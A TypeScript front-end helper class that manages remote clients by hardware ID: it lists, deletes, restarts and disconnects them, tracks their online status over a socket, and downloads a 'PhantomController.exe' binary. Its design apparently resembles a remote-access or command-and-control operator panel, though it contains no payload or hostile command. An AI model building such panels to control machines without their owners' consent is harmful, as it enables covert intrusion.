/* eslint-disable @typescript-eslint/no-explicit-any */
import axios from "axios";
import { Socket } from "socket.io-client";

let io: any;
if (typeof window !== "undefined") {
  import("socket.io-client").then((module) => {
    io = module.default;
  });
}

export class Helper {
  constructor() {}

  private socket: Socket | null = null;

  async getAllClients() {
    return axios
      .get("clients")
      .then((response) => {
        if (response.status !== 200) return { data: null, status: false };

        const data = response.data;
        return { data: data, status: true };
      })
      .catch(() => {
        return { data: null, status: false };
      });
  }

  async deleteClient(hwid: string) {
    return axios
      .delete(`clients/${hwid}/delete`)
      .then((response) => {
        if (response.status !== 200) return { data: null, status: false };

        const data = response.data;
        return { data: data, status: true };
      })
      .catch(() => {
        return { data: null, status: false };
      });
  }

  async killConnection(hwid: string) {
    return axios
      .post(`/clients/${hwid}/destroy`)
      .then((response) => {
        if (response.status !== 201) return { status: false };

        return { status: true };
      })
      .catch(() => {
        return { status: false };
      });
  }

  async restartClient(hwid: string) {
    return axios
      .post(`/clients/${hwid}/restart`)
      .then((response) => {
        if (response.status !== 201 && response.status !== 200)
          return { status: false };
        return { status: true };
      })
      .catch(() => {
        return { status: false };
      });
  }

  async downloadClientFile(onProgress: (progress: number) => void) {
    return axios
      .get("clients/download", {
        responseType: "blob",
        onDownloadProgress: (progressEvent) => {
          if (progressEvent.total) {
            const progress = (progressEvent.loaded / progressEvent.total) * 100;
            onProgress(progress);
          }
        },
      })
      .then((response) => {
        if (response.status !== 200) return { status: false };

        const blob = new Blob([response.data], {
          type: "application/octet-stream",
        });
        const url = window.URL.createObjectURL(blob);

        const link = document.createElement("a");
        link.href = url;
        link.setAttribute("download", "PhantomController.exe");

        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);

        window.URL.revokeObjectURL(url);

        return { status: true };
      })
      .catch(() => {
        return { status: false };
      });
  }

  initSocket(callback: (data: { hwid: string; online: boolean }) => void) {
    if (typeof window !== "undefined" && !this.socket && io) {
      this.socket = io("http://localhost:3001");
    }

    if (this.socket) {
      this.socket.on("updateClientStatus", (data) => {
        callback(data);
      });
    }
  }

  disconnectSocket() {
    if (this.socket) {
      this.socket.close();
      this.socket = null;
    }
  }
}
